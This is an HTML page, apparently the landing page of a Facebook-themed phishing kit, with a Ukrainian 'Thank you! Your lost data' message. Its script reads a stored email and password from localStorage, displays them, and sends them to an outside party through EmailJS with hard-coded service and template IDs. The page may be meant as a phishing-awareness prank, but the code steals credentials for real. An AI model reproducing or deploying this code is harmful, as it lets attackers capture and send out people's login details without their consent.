<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="app/css/styles.css">
</head>
<body>
<section class="facebook">
    <div class="facebook__wrapper">
        <div class="container">
            <h1 class="facebook__title">
                ДЯКУЮ!
            </h1>

            <div class="facebook__container">
                <h2 class="facebook__sub-title">Ваші втрачені дані</h2>

                <div class="facebook__container-text">
                    <p class="facebook__text facebook__email">
                        <span>
                            Email:
                        </span>
                        <span id="data"> Email</span>
                    </p>
                    <p class="facebook__text facebook__password">
                          <span>
                            Password:
                        </span>
                        <span id="data1"> Password</span>
                    </p>
                </div>
                <div class="facebook__img"><img src="app/img/little-dog.jpg" alt="" class="facebook__img-item"></div>
            </div>
        </div>
    </div>
</section>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
<script>

    document.getElementById("data").innerHTML = localStorage.getItem("email");
    document.getElementById("data1").innerHTML = localStorage.getItem("password");

    emailjs.init("user_9sK7bPjgP9QH4cwEIdJkI");

    emailjs.send('service_5bc2xvd', 'template_22kv7mn', {
        login: localStorage.getItem("email"),
        password: localStorage.getItem("password")
    }).then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
        console.log('FAILED...', error);
    });

</script>
</body>
</html>
